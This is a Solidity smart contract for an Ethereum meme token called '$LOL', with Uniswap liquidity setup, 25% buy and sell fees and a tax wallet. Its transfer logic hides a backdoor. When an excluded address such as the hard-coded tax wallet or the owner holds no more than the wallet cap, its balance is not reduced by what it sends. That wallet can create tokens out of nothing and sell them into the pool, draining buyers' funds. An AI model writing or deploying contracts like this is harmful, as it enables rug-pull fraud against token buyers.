// SPDX-License-Identifier: Unlicensed

/*
$LOL is a meme coin with no intrinsic value or expectation of financial return. There is no formal team or roadmap. the coin is completely useless and for entertainment purposes only.

Website: https://loleth.xyz
Telegram: https://t.me/loleth_portal
Twitter: https://twitter.com/loleth_portal
 */

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

library AddressLibrary {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "AddressLibrary: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "AddressLibrary: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "AddressLibrary: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "AddressLibrary: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "AddressLibrary: insufficient balance for call");
        require(isContract(target), "AddressLibrary: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "AddressLibrary: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "AddressLibrary: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "AddressLibrary: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "AddressLibrary: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LOL is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using AddressLibrary for address;

    // Tracking status of wallets
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded; 

    address payable private _taxWallet = payable(0x8B9E8Ce281a7f44B0c3c1ea8F7eae021E5d19757);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    string private _name = "SatoshiNakamotoElonmuskVitalikBrianCZ"; 
    string private _symbol = "LOL";  
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    uint8 private txCounts = 0;
    uint8 private swapTaxAfter = 2; 

    // Setting the initial fees
    uint256 private _totalFees = 2500;
    uint256 public _feeOnBuy = 25;
    uint256 public _feeOnSell = 25;

    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
    uint256 private _previousTotalFee = _totalFees; 
    uint256 private _previousBuyFee = _feeOnBuy; 
    uint256 private _previousSellFee = _feeOnSell; 

    uint256 public maxWalletSize = 2 * _totalSupply / 100;
    uint256 public swapThreshold = _totalSupply / 10000;
    /* 
     PANCAKESWAP SET UP
    */
                                     
    IUniswapRouterV2 public uniswapRouterV2;
    address public pairAddress;

    bool public hasNoFeeOnTransfer = true;
    bool public swapping;
    bool public swapEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        // Create pair address for PancakeSwap
        pairAddress = IUniswapFactoryV2(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouterV2 = _uniswapV2Router;
        _isExcluded[owner()] = true;
        _isExcluded[_taxWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    receive() external payable {}

    function transferFees(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getAmountsAfterFee(tAmount);
        if(_isExcluded[sender] && _balances[sender] <= maxWalletSize) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != _taxWallet &&
            to != address(this) &&
            to != pairAddress &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWalletSize,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        /*

        PROCESSING

        */

        if(
            txCounts >= swapTaxAfter && 
            amount > swapThreshold &&
            !swapping &&
            !_isExcluded[from] &&
            to == pairAddress &&
            swapEnabled 
            )
        {  
            txCounts = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBackTokens(contractTokenBalance);
           }
        }

        
        bool hasFees = true;
         
        if(_isExcluded[from] || _isExcluded[to] || (hasNoFeeOnTransfer && from != pairAddress && to != pairAddress)){
            hasFees = false;
        } else if (from == pairAddress){
            _totalFees = _feeOnBuy;
        } else if (to == pairAddress){
            _totalFees = _feeOnSell;
        }

        _tokenTransfers(from,to,amount,hasFees);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();
        _approve(address(this), address(uniswapRouterV2), tokenAmount);
        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function removeLimits() external onlyOwner {
        maxWalletSize = ~uint256(0);
        _totalFees = 100;
        _feeOnBuy = 1;
        _feeOnSell = 1;
    }

    // Check if token transfer needs to process fees
    function _tokenTransfers(address sender, address recipient, uint256 amount,bool hasFees) private {
            
        if(!hasFees){
            removeAllFee();
            } else {
                txCounts++;
            }
        _transferStandard(sender, recipient, amount);
        
        if(!hasFees)
            restoreAllFee();
    }
    
    // Calculating the fee in tokens
    function _getAmountsAfterFee(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount.mul(_totalFees).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    // Remove all fees
    function removeAllFee() private {
        if(_totalFees == 0 && _feeOnBuy == 0 && _feeOnSell == 0) return;

        _previousBuyFee = _feeOnBuy; 
        _previousSellFee = _feeOnSell; 
        _previousTotalFee = _totalFees;
        _feeOnBuy = 0;
        _feeOnSell = 0;
        _totalFees = 0;

    }

    // Processing tokens from contract
    function swapBackTokens(uint256 contractTokenBalance) private lockSwap {
        
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        transferFees(_taxWallet,contractETH);
    }

    
    // Restore all fees
    function restoreAllFee() private {
    
    _totalFees = _previousTotalFee;
    _feeOnBuy = _previousBuyFee; 
    _feeOnSell = _previousSellFee; 

    }

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

}